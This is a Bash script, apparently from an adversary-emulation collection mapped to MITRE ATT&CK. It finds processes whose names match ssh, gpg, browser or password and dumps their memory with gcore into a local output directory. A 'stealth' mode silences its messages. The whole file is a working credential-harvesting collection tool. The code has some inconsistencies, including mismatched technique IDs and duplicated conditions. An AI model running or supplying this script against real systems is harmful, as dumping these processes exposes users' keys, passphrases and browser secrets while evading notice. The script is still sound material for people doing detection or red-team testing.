
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1119_001A_DEBUG_MODE="${T1119_001A_DEBUG_MODE:-false}"
    export T1119_001A_TIMEOUT="${T1119_001A_TIMEOUT:-300}"
    export T1119_001A_FALLBACK_MODE="${T1119_001A_FALLBACK_MODE:-real}"
    export T1119_001A_OUTPUT_FORMAT="${T1119_001A_OUTPUT_FORMAT:-json}"
    export T1119_001A_POLICY_CHECK="${T1119_001A_POLICY_CHECK:-true}"
    export T1119_001A_MAX_FILES="${T1119_001A_MAX_FILES:-200}"
    export T1119_001A_MAX_FILE_SIZE="${T1119_001A_MAX_FILE_SIZE:-1048576}"
    export T1119_001A_SCAN_DEPTH="${T1119_001A_SCAN_DEPTH:-3}"
    export T1119_001A_EXCLUDE_CACHE="${T1119_001A_EXCLUDE_CACHE:-true}"
    export T1119_001A_CAPTURE_DURATION="${T1119_001A_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1001a - Automated Collection: Process Memory Dumps Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Automatically dump process memory ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat ps; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    if ! command -v gcore >/dev/null && ! command -v gdb >/dev/null; then
        [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Memory dump tools (gcore or gdb) required"; exit 1
    fi
}

Load-EnvironmentVariables() {
    export T1119_001A_OUTPUT_BASE="${T1119_001A_OUTPUT_BASE:-./mitre_results}"
    export T1119_001A_TIMEOUT="${T1119_001A_TIMEOUT:-300}"
    export T1119_001A_OUTPUT_MODE="${T1119_001A_OUTPUT_MODE:-simple}"
    export T1119_001A_SILENT_MODE="${T1119_001A_SILENT_MODE:-false}"
    export T1119_001A_MAX_DUMPS="${T1119_001A_MAX_DUMPS:-5}"
    
    export T1119_001A_TARGET_PROCESSES="${T1119_001A_TARGET_PROCESSES:-auto}"
    export T1119_001A_PROCESS_PATTERNS="${T1119_001A_PROCESS_PATTERNS:-ssh,gpg,browser,password}"
    export T1119_001A_MAX_DUMP_SIZE="${T1119_001A_MAX_DUMP_SIZE:-1073741824}"
    export T1119_001A_DUMP_METHOD="${T1119_001A_DUMP_METHOD:-gcore}"
}

Validate-SystemPreconditions() {
    [[ -z "$T1119_001A_OUTPUT_BASE" ]] && { [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1119_001A_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1119_001A_OUTPUT_BASE")" ]] && { [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    # Check if we have root privileges
        if [[ $(id -u) -ne 0 ]]; then
            [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && [[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[WARNING]" >&2 # Root privileges not available - will attempt user-mode collection"
            export USER_MODE="true"
        else
            export USER_MODE="false"
        fi
    return 0
}

Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1119_001A_OUTPUT_BASE/T1001a_process_dumps_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{memory_dumps,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

Dump-ProcessMemory() {
    local pid="$1" collection_dir="$2" process_name="$3"
    
    [[ ! -d "/proc/$pid" ]] && return 1
    
    local dump_file="$collection_dir/memory_dumps/memdump_${process_name}_${pid}_$(date +%s).core"
    
    if command -v gcore >/dev/null; then
        if gcore -o "${dump_file%.core}" "$pid" >/dev/null 2>&1; then
            local file_size=$(stat -c%s "$dump_file" 2>/dev/null || echo 0)
            [[ $file_size -gt $T1119_001A_MAX_DUMP_SIZE ]] && { rm -f "$dump_file"; return 1; }
            
            echo "$dump_file:$file_size"
            [[ "$T1119_001A_SILENT_MODE" != "true" ]] && echo "  + Dumped: PID $pid ($file_size bytes)" >&2
            return 0
        fi
    fi
    return 1
}

Get-TargetProcesses() {
    if [[ "$T1119_001A_TARGET_PROCESSES" == "auto" ]]; then
        IFS=',' read -ra patterns <<< "$T1119_001A_PROCESS_PATTERNS"
        for pattern in "${patterns[@]}"; do
            pattern=$(echo "$pattern" | xargs)
            ps -eo pid,comm --no-headers | grep -i "$pattern" | head -3
        done
    else
        echo "$T1119_001A_TARGET_PROCESSES" | tr ',' '\n'
    fi
}

Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

Log-ExecutionMessage() {
    [[ "${T1119_001A_SILENT_MODE}" != "true" && "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$1" >&2
}

Generate-SimpleOutput() {
    echo "PROCESS MEMORY DUMPS "
    echo "Dumps: $1"
    echo "Size: $2 bytes"
    echo "Complete"
}

Generate-DebugOutput() {
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1001a",
    "results": {
        "dumps_collected": $1,
        "total_size_bytes": $2,
        "collection_directory": "$3"
    }
}
EOF
)
    echo "$json_output" > "$3/metadata/results.json"
    [[ "$T1119_001A_SILENT_MODE" != "true" ]] && echo "$json_output"
}

Generate-StealthOutput() { echo "$1" > /dev/null 2>&1; }
Generate-NoneOutput() { :; }
# 4 MAIN ORCHESTRATORS (10-20 lines each)
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    echo "$(Initialize-OutputStructure)"
}

Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Starting process memory dumps..."
    
    local target_processes
    target_processes=($(Get-TargetProcesses))
    
    for process_info in "${target_processes[@]}"; do
        local pid=$(echo "$process_info" | awk '{print $1}')
        local comm=$(echo "$process_info" | awk '{print $2}')
        
        if result=$(Dump-ProcessMemory "$pid" "$collection_dir" "$comm"); then
            IFS=':' read -r file_path file_size <<< "$result"
            collected_files+=("$file_path")
            total_size=$((total_size + file_size))
            ((file_count++))
            [[ $file_count -ge ${T1119_001A_MAX_DUMPS:-5} ]] && break
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

Write-StandardizedOutput() {
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$2" "$3" "$1" ;;
        "debug")   Generate-DebugOutput "$2" "$3" "$1" ;;
        "stealth") Generate-StealthOutput "$2" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

Main() {
    trap '[[ "${T1119_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    local collection_dir results
    collection_dir=$(Get-Configuration) || exit 2
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected dumps collected"
    exit 0
}

Main "$@"